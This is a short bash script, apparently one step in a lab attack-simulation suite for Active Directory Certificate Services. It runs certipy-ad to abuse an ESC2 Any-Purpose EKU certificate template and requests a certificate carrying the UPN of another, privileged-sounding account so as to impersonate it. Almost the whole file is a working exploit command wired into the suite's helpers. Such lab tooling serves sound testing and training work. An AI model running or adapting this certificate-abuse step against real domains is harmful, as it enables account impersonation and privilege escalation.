#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC2 template published
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "051" "ESC2 — Any-Purpose EKU certificate request"

require_tool certipy-ad

log "Requesting certificate with any-purpose EKU"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC2 -upn chief_command@$DOMAIN_ROOT -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC2 — certificate request"
